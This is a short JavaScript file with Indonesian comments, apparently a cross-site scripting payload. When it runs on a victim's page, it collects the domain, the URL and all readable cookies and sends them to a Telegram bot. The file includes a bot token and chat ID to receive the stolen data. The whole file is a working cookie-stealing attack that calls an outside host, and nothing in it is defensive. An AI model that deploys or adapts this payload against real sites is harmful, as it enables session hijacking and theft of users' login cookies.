// Ganti dengan token bot dan chat ID kamu
const BOT_TOKEN = "7243753634:AAHawNDB21EBLpZSk0Tk_pgSTu9iS28RCIg";
const CHAT_ID = "6902958231";

// Ambil informasi target
const domain = document.domain;
const url = window.location.hostname + window.location.pathname;
const cookies = document.cookie || "No Cookies Found"; // Jika tidak ada cookie

// Format pesan
const message = `
🚨 <b>XSS Alert Detected!</b> 🚨
----------------------------------------
🌐 <b>Domain:</b> ${domain}
🔗 <b>URL:</b> <pre>${url}</pre>
🍪 <b>Cookies:</b> <pre>${cookies}</pre>
`;

// Kirim ke Telegram
fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    chat_id: CHAT_ID,
    text: message,
    parse_mode: "HTML"
  })
});